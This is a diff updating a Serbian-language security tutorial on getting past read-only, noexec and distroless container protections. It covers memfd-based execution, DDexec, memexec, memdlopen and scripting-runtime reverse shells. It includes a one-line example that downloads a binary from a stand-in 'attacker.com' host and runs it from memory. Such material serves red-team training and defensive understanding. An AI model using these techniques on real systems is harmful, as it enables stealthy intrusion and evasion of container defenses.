@@ -1,17 +1,15 @@
-# Zaobilaženje FS zaštita: read-only / no-exec / Distroless
+# Bypass FS protections: read-only / no-exec / Distroless
 
-{{#include ../../../../banners/hacktricks-training.md}}
+## Videos
 
-## Video zapisi
+U sledećim video-snimcima možete pronaći detaljnije objašnjenje tehnika pomenutih na ovoj stranici:<sup>[[1]](#references)[[2]](#references)</sup>
 
-U sledećim video zapisima možete pronaći detaljnije objašnjene tehnike pomenute na ovoj stranici:<sup>[[1]](#references)[[2]](#references)</sup>
+- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
+- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>
 
-- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
-- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>
+## scenario read-only / no-exec
 
-## read-only / no-exec scenario
-
-Sve je češća pojava da se Linux mašine pokreću sa **read-only (ro) zaštitom fajl sistema**, naročito u kontejnerima. Razlog je to što je pokretanje kontejnera sa ro fajl sistemom jednostavno kao postavljanje **`readOnlyRootFilesystem: true`** u `securitycontext`:
+U containeru možete montirati root filesystem kao read-only postavljanjem **`readOnlyRootFilesystem: true`** u security contextu.<sup>[[3]](#references)</sup> Na primer:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -26,40 +24,40 @@ securityContext:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-Međutim, čak i kada je fajl sistem montiran kao ro, **`/dev/shm`** će i dalje biti upisiv, pa nije tačno da ne možemo ništa da upišemo na disk. Ipak, ovaj folder će biti **montiran sa no-exec zaštitom**, pa, ako ovde preuzmete binary, **nećete moći da ga izvršite**.
+Read-only root ne čini zasebno montirane volumene read-only. Docker tretira **`/dev/shm`** kao IPC mount, dok su tmpfs opcije kao što su `rw` i `noexec` izbori runtime konfiguracije; proverite opcije mounta ciljnog containera pre nego što se oslonite na bilo koje od ovih ponašanja.<sup>[[4]](#references)[[5]](#references)</sup>
 
 > [!WARNING]
-> Iz perspektive red team-a, ovo **otežava preuzimanje i izvršavanje** binary-ja koji se već ne nalaze na sistemu (kao što su backdoor-i ili enumeratori poput `kubectl`).
+> Iz perspektive red-team-a, ova kombinacija može otežati preuzimanje i izvršavanje binarnih fajlova koji već nisu dostupni (na primer, backdoor-a ili enumeration alata).<sup>[[4]](#references)[[5]](#references)</sup>
 
-## Najlakši bypass: skripte
+## Najlakši bypass: Scripts
 
-Imajte na umu da sam pomenuo binary-je: možete **izvršiti bilo koju skriptu** sve dok se interpreter nalazi na mašini, na primer **shell script** ako je `sh` prisutan ili **python** **script** ako je `python` instaliran.
+`noexec` mount blokira direktno izvršavanje binarnih fajlova na tom mountu, ali interpreter i dalje može da čita i interpretira skriptu. Ako su `sh` ili `python` prisutni, možete pokrenuti shell ili Python skriptu kroz taj interpreter.<sup>[[5]](#references)</sup>
 
-Međutim, ovo samo po sebi nije dovoljno za izvršavanje vašeg binary backdoor-a ili drugih binary alata koje možda morate da pokrenete.
+Ovo ne pomaže kada je sam potreban alat binarni fajl.<sup>[[5]](#references)</sup>
 
-## Zaobilaženja putem memorije
+## Memory Bypasses
 
-Ako želite da izvršite binary, ali fajl sistem to ne dozvoljava, najbolji način je da ga **izvršite iz memorije**, pošto se **zaštite tamo ne primenjuju**.
+Kada je direktno izvršavanje sa montirane putanje blokirano, jedna od opcija je učitavanje ELF-a u memoriju i njegovo izvršavanje kroz in-memory putanju. Time se izbegava `noexec` provera na tom mountu, ali se ne uklanjaju druge kontrole kernela, dozvola ili policy-ja.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### FD + exec syscall bypass
 
-Ako na mašini imate neke moćne script engine-e, kao što su **Python**, **Perl** ili **Ruby**, možete preuzeti binary koji treba izvršiti u memoriju, smestiti ga u memory file descriptor (`create_memfd` syscall), na koji se te zaštite neće primenjivati, a zatim pozvati **`exec` syscall** i navesti **fd kao fajl koji treba izvršiti**.
+Ako scripting runtime može da pristupi relevantnom Linux interfejsu, može da kreira anoniman file descriptor sa RAM podrškom pomoću **`memfd_create(2)`**, upiše ELF bajtove u njega i upotrebi execution path zasnovan na fd-u. Projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generiše kompresovan i base64-enkodovan Python, Perl ili Ruby kod za ovaj workflow.<sup>[[6]](#references)[[7]](#references)</sup>
 
-Za ovo možete jednostavno koristiti projekat [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Možete mu proslediti binary, a on će generisati script u navedenom jeziku, sa **kompresovanim i b64 kodiranim binary-jem**, kao i instrukcijama za njegovo **dekodiranje i dekompresovanje** u **fd** kreiran pozivanjem `create_memfd` syscall-a, nakon čega sledi poziv **exec** syscall-a za njegovo pokretanje.
+Projekat trenutno dokumentuje Python, Perl i Ruby targete; PHP ili Node zahtevaju drugačiju runtime-specific tehniku ili ekstenziju, tako da odsustvo ovog generatora za neki jezik ne znači da je in-memory izvršavanje nemoguće.<sup>[[6]](#references)[[12]](#references)</sup>
 
 > [!WARNING]
-> Ovo ne funkcioniše u drugim scripting jezicima, kao što su PHP ili Node, zato što oni nemaju **podrazumevani način za pozivanje raw syscall-ova** iz script-a, pa nije moguće pozvati `create_memfd` radi kreiranja **memory fd-a** u koji bi se smestio binary.
+> Običan executable upisan u **`/dev/shm`** i dalje podleže **`noexec`** podešavanju tog mounta; samo otvaranje kroz običan file descriptor ne menja policy mounta.<sup>[[5]](#references)</sup>
 >
-> Pored toga, kreiranje **regularnog fd-a** sa fajlom u `/dev/shm` neće funkcionisati, jer ga nećete moći pokrenuti: na njega će se primeniti **no-exec zaštita**.
+> Tačan memory-execution metod takođe zavisi od runtime-a, arhitekture, kernela i dostupnih dozvola.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) je tehnika koja vam omogućava da **izmenite memoriju sopstvenog procesa** prepisivanjem njegovog **`/proc/self/mem`**.
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) upisuje stager i loader u running shell proces kroz **`/proc/self/mem`**, a zatim prebacuje kontrolu na taj kod.<sup>[[8]](#references)</sup>
 
-Zahvaljujući kontroli nad assembly kodom koji proces izvršava, možete upisati **shellcode** i „mutirati“ proces tako da **izvršava proizvoljan kod**.
+To omogućava procesu da učita dostavljeni binarni fajl bez prethodnog postavljanja tog binarnog fajla na executable filesystem.<sup>[[8]](#references)</sup>
 
 > [!TIP]
-> **DDexec / EverythingExec** vam omogućava da učitate i **izvršite** sopstveni **shellcode** ili **bilo koji binary** iz **memorije**.
+> **DDexec / EverythingExec** može da učita i **izvrši** shellcode ili binarni fajl iz **memorije**.<sup>[[8]](#references)</sup>
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
@@ -72,17 +70,17 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) je prirodni sledeći korak nakon DDexec-a. To je **DDexec shellcode demonizovan**, tako da svaki put kada želite da **pokrenete drugi binary** ne morate ponovo da pokrećete DDexec; možete samo da pokrenete memexec shellcode putem DDexec tehnike, a zatim **komunicirate sa ovim daemon-om da biste prosledili nove binary-je za učitavanje i pokretanje**.
+[**Memexec**](https://github.com/arget13/memexec) je daemonized implementacija alata DDexec. Njegov daemon sluša zahteve koji sadrže argumente i sirove bajtove programa, kreira child proces za učitavanje i pokretanje svakog programa, dok parent ostaje server.<sup>[[9]](#references)</sup>
 
-Primer upotrebe **memexec-a za izvršavanje binary-ja iz PHP reverse shell-a** možete pronaći na [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Repository uključuje primer korišćenja alata **memexec za izvršavanje binarnih datoteka iz PHP reverse shell-a** u fajlu [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>
 
 ### Memdlopen
 
-Sa sličnom namenom kao DDexec, tehnika [**memdlopen**](https://github.com/arget13/memdlopen) omogućava **jednostavniji način učitavanja binary-ja** u memoriju radi njihovog kasnijeg izvršavanja. Može omogućiti čak i učitavanje binary-ja sa dependencies.
+Sa sličnom namenom kao DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) je fileless implementacija funkcije `dlopen()` za shared object ili program. Njegov README trenutno dokumentuje podršku za ARM64, zato proverite ciljnu arhitekturu pre korišćenja.<sup>[[10]](#references)</sup>
 
 ## Distroless Bypass
 
-Za posebno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne pomaže i kako menja post-exploitation tradecraft u container-ima, pogledajte:
+Za detaljno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne pomaže i kako menja post-exploitation tradecraft u kontejnerima, pogledajte:
 
 {{#ref}}
 ../../../containers-namespaces/container-security/distroless.md
@@ -90,32 +88,41 @@ Za posebno objašnjenje **šta distroless zapravo jeste**, kada pomaže, kada ne
 
 ### Šta je distroless
 
-Distroless container-i sadrže samo **minimalne komponente neophodne za pokretanje određene aplikacije ili service-a**, kao što su library-ji i runtime dependencies, ali isključuju veće komponente kao što su package manager, shell ili system utilities.
+Distroless images sadrže samo aplikaciju i njene runtime dependencies; zvanične images ne sadrže package managere, shell-ove i druge programe koji se očekuju u standardnoj Linux distribuciji.<sup>[[11]](#references)</sup>
 
-Cilj distroless container-a je da **smanje attack surface container-a uklanjanjem nepotrebnih komponenti** i minimizovanjem broja vulnerabilities koje mogu biti exploit-ovane.
+Ograničavanje runtime image-a na te dependencies smanjuje količinu softvera prisutnog u produkciji, kao i količinu koju treba skenirati i pratiti.<sup>[[11]](#references)</sup>
 
 ### Reverse Shell
 
-U distroless container-u možda **nećete pronaći čak ni `sh` ili `bash`** za dobijanje regularnog shell-a. Takođe nećete pronaći binary-je kao što su `ls`, `whoami`, `id`... odnosno sve ono što obično pokrećete na system-u.
+U distroless kontejneru možda **nećete pronaći `sh` ili `bash`** za regularni shell, niti uobičajene utility-je kao što su `ls`, `whoami` ili `id`.<sup>[[11]](#references)</sup>
 
 > [!WARNING]
-> Zbog toga **nećete moći da dobijete** **reverse shell** niti da **enumerate-ujete** system na uobičajen način.
+> Zbog toga uobičajeni shell-based reverse shell ili utility-based enumeration možda neće raditi.<sup>[[11]](#references)</sup>
 
-Međutim, ako compromised container, na primer, pokreće flask web aplikaciju, onda je python instaliran i možete preuzeti **Python reverse shell**. Ako pokreće node, možete preuzeti Node rev shell, a isto važi za gotovo bilo koji **scripting language**.
-
-> [!TIP]
-> Korišćenjem scripting language-a možete **enumerate-ovati system** pomoću mogućnosti tog language-a.
-
-Ako ne postoje **`read-only/no-exec`** protections, možete abuse-ovati svoj reverse shell da **upišete binary-je u file system** i **izvršite** ih.
+Ako compromised aplikacija uključuje language runtime (na primer, Python za Flask aplikaciju ili Node.js za Node aplikaciju), RCE i dalje može moći da koristi taj runtime za command channel i system inspection kroz njegove API-je.<sup>[[11]](#references)[[12]](#references)</sup>
 
 > [!TIP]
-> Međutim, u ovoj vrsti container-a ove protections obično postoje, ali možete koristiti **prethodne memory execution tehnike da ih zaobiđete**.
+> Koristite dostupni scripting language za **enumeration sistema** kroz njegove jezičke mogućnosti.<sup>[[12]](#references)</sup>
 
-Primeri za **exploit-ovanje nekih RCE vulnerabilities** radi dobijanja **reverse shell-ova scripting language-a** i izvršavanja binary-ja iz memorije dostupni su na [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ako ne postoje **read-only/no-exec** zaštite, command channel može upisati binarne datoteke na writable, executable mount i pokrenuti ih; prvo proverite mount opcije i permissions.<sup>[[4]](#references)[[5]](#references)</sup>
 
-## Reference
+> [!TIP]
+> Kada su ove zaštite prisutne, koristite **memory-execution techniques iznad** tamo gde runtime, kernel i permissions to dozvoljavaju.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>
 
-- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
-- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
+**Primere** iskorišćavanja RCE ranjivosti za dobijanje scripting-language **reverse shell-ova** i izvršavanje binarnih datoteka iz memorije možete pronaći u projektu [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>
 
+## References
+
+- [1] [DEF CON 31 - Istraživanje Linux manipulacije memorijom za stealth i evasion](https://www.youtube.com/watch?v=poHirez8jk4)
+- [2] [Stealth intrusions sa DDexec-ng i dlopen() u memoriji - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [3] [Konfigurisanje Security Context-a za Pod ili Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
+- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
+- [5] [mount(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
+- [7] [memfd_create(2) - Linux manualna stranica](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
+- [8] [DDexec](https://github.com/arget13/DDexec)
+- [9] [memexec](https://github.com/arget13/memexec)
+- [10] [memdlopen](https://github.com/arget13/memdlopen)
+- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
+- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
 {{#include ../../../../banners/hacktricks-training.md}}
